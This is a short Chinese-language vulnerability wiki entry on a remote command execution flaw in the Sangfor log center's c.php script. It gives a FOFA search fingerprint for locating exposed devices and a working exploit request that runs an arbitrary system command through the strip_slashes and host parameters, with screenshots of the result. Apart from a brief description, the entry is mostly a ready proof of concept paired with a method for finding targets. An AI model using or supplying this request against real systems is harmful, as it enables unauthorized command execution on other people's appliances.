#  深信服 日志中心 c.php 远程命令执行漏洞

## 漏洞描述

深信服 日志中心 c.php  远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行

## 漏洞影响

> [!NOTE]
>
> 深信服 日志中心

## FOFA

> [!NOTE]
>
> body="isHighPerformance : !!SFIsHighPerformance,"

## 漏洞复现

登录页面如下

![image-20210531192407444](http://wikioss.peiqi.tech/vuln/image-20210531192407444.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

访问漏洞Url

```
/tool/log/c.php?strip_slashes=system&host=ipconfig
```

![image-20210531192540462](http://wikioss.peiqi.tech/vuln/image-20210531192540462.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)